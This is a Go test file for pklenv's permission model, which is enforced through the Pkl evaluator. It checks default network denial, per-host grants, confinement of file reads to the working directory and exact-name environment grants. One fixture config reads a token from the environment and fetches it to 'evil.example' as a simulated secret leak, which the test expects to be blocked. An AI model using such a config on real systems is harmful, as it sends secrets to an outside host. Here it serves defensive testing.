package cli

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/idleberg/pklenv/internal/config"
	"github.com/idleberg/pklenv/internal/schema"
)

// hintFor returns the advice pklenv would print under an error.
//
// The run helper calls ExecuteContext, while hints are printed by Main through
// reportFatal, so they never reach the captured stderr. Reaching for the hint on
// the error keeps these tests about the wiring instead of about the harness.
func hintFor(t *testing.T, err error) string {
	t.Helper()
	var evalErr *config.EvalError
	if !errors.As(err, &evalErr) {
		t.Fatalf("expected a Pkl evaluation error, got %T: %v", err, err)
	}
	return evalErr.Hint()
}

// These go through the real pkl evaluator. The permission model is enforced by
// Pkl, not by pklenv, so a test with a stubbed evaluator would assert only that
// pklenv passes the arguments it means to — which is the half that cannot break
// silently.

// TestNetworkIsDeniedByDefault covers the channel the whole permission model
// exists for: a config that builds a URL out of a secret and fetches it.
func TestNetworkIsDeniedByDefault(t *testing.T) {
	requirePkl(t)

	const token = "AKIAsupersecret42"
	dir := t.TempDir()
	writeConfig(t, dir, "env.pkl", `
vars {
  ["X"] = read("https://evil.example/?leak=" + read("env:PKLENV_TEST_TOKEN")).text
}
`)
	t.Setenv("PKLENV_TEST_TOKEN", token)

	stdout, stderr, err := run(t, dir, "emit")
	if err == nil {
		t.Fatal("the fetch should have been refused")
	}

	all := stdout + stderr + err.Error()
	if strings.Contains(all, token) {
		t.Errorf("pklenv blocked the fetch and then printed the secret itself:\n%s", all)
	}
	if !strings.Contains(all, "evil.example") {
		t.Errorf("the origin should survive, so the hint can be acted on:\n%s", all)
	}
	if hint := hintFor(t, err); !strings.Contains(hint, "--allow-net=evil.example") {
		t.Errorf("the hint should name the flag and host that unblock it, got %q", hint)
	}
}

// TestAllowNetIsPerHost checks that a grant is a grant of one origin, not of
// the network.
func TestAllowNetIsPerHost(t *testing.T) {
	requirePkl(t)

	dir := t.TempDir()
	writeConfig(t, dir, "env.pkl", `
vars {
  ["X"] = read("https://blocked.example/x").text
}
`)

	_, stderr, err := run(t, dir, "emit", "--allow-net=allowed.example")
	if err == nil {
		t.Fatal("allowing one host must not allow another")
	}
	if !strings.Contains(stderr+err.Error(), "blocked.example") {
		t.Errorf("the refusal should name the host that was actually reached:\n%s", stderr)
	}
}

// TestFileReadsAreConfinedToTheWorkingDirectory covers ~/.ssh and ~/.aws, which
// any config could read before this.
func TestFileReadsAreConfinedToTheWorkingDirectory(t *testing.T) {
	requirePkl(t)

	// Laid out as siblings under one parent, because widening the boundary has
	// to admit the config as well as the file it reads — a root that excluded
	// the config would fail for a second, unrelated reason.
	parent := t.TempDir()
	outside := filepath.Join(parent, "outside.txt")
	if err := os.WriteFile(outside, []byte("sensitive\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	dir := filepath.Join(parent, "project")
	if err := os.Mkdir(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeConfig(t, dir, "env.pkl", `
vars {
  ["X"] = read("file://`+outside+`").text.trim()
}
`)

	_, _, err := run(t, dir, "emit")
	if err == nil {
		t.Fatal("a read above the working directory should have been refused")
	}
	if hint := hintFor(t, err); !strings.Contains(hint, "--root-dir") {
		t.Errorf("the hint should name --root-dir, got %q", hint)
	}

	// The same read succeeds once the boundary is widened to include it, which
	// is what makes the default a boundary rather than a wall.
	if _, stderr, err := run(t, dir, "emit", "--root-dir", parent, "--force"); err != nil {
		t.Fatalf("--root-dir should permit the read: %v\n%s", err, stderr)
	}
}

func TestAllowEnvNarrowsByExactName(t *testing.T) {
	requirePkl(t)

	dir := t.TempDir()
	writeConfig(t, dir, "env.pkl", `
vars {
  ["A"] = read("env:PKLENV_TEST_GRANTED")
  ["B"] = read("env:PKLENV_TEST_GRANTED_EXTRA")
}
`)
	t.Setenv("PKLENV_TEST_GRANTED", "yes")
	t.Setenv("PKLENV_TEST_GRANTED_EXTRA", "no")

	// A grant of one name must not extend to a name it happens to prefix.
	_, _, err := run(t, dir, "emit", "--allow-env=PKLENV_TEST_GRANTED")
	if err == nil {
		t.Fatal("granting PKLENV_TEST_GRANTED must not also grant PKLENV_TEST_GRANTED_EXTRA")
	}
	hint := hintFor(t, err)
	if !strings.Contains(hint, "--allow-env") {
		t.Errorf("the hint should name --allow-env, not --allow-net, got %q", hint)
	}
	if !strings.Contains(hint, "PKLENV_TEST_GRANTED_EXTRA") {
		t.Errorf("the hint should name the variable that was refused, got %q", hint)
	}

	if _, stderr, err := run(t, dir, "emit", "--allow-env=PKLENV_TEST_GRANTED,PKLENV_TEST_GRANTED_EXTRA", "--force"); err != nil {
		t.Fatalf("granting both should succeed: %v\n%s", err, stderr)
	}
}

func TestEnvIsUnrestrictedWithoutTheFlag(t *testing.T) {
	requirePkl(t)

	dir := t.TempDir()
	writeConfig(t, dir, "env.pkl", `
vars {
  ["A"] = read("env:PKLENV_TEST_AMBIENT")
}
`)
	t.Setenv("PKLENV_TEST_AMBIENT", "present")

	if _, stderr, err := run(t, dir, "emit"); err != nil {
		t.Fatalf("reading the environment should need no flag: %v\n%s", err, stderr)
	}
}

// TestWorkingDirGovernsEverything pins the single-chdir design: one flag has to
// move discovery, the output location and the root boundary together, or they
// disagree about which directory the run is about.
func TestWorkingDirGovernsEverything(t *testing.T) {
	requirePkl(t)

	parent := t.TempDir()
	sub := filepath.Join(parent, "service")
	if err := os.Mkdir(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	writeConfig(t, sub, "env.pkl", basicConfig)

	if _, stderr, err := run(t, parent, "emit", "-w", "service"); err != nil {
		t.Fatalf("emit -w failed: %v\n%s", err, stderr)
	}
	if _, err := os.Stat(filepath.Join(sub, ".env")); err != nil {
		t.Errorf("discovery and output should both follow --working-dir: %v", err)
	}
	if _, err := os.Stat(filepath.Join(parent, ".env")); err == nil {
		t.Error("nothing should have been written to the directory pklenv started in")
	}
	// The schema is vendored where the configs are, so it lands inside the root
	// boundary without anyone having to widen it.
	if _, err := os.Stat(filepath.Join(sub, schema.Filename)); err != nil {
		t.Errorf("the schema should be vendored beside the configs: %v", err)
	}
}

// TestSchemaIsVendoredWithoutNetworkAccess is the reason denying the network by
// default is livable: the ordinary path needs no flag at all.
func TestSchemaIsVendoredWithoutNetworkAccess(t *testing.T) {
	requirePkl(t)

	dir := t.TempDir()
	writeConfig(t, dir, "env.pkl", basicConfig)

	if _, stderr, err := run(t, dir, "emit"); err != nil {
		t.Fatalf("a plain config should evaluate with no permission flags: %v\n%s", err, stderr)
	}

	body, err := os.ReadFile(filepath.Join(dir, schema.Filename))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(body), "generated by pklenv") {
		t.Error("the vendored schema should carry its generated header")
	}
}
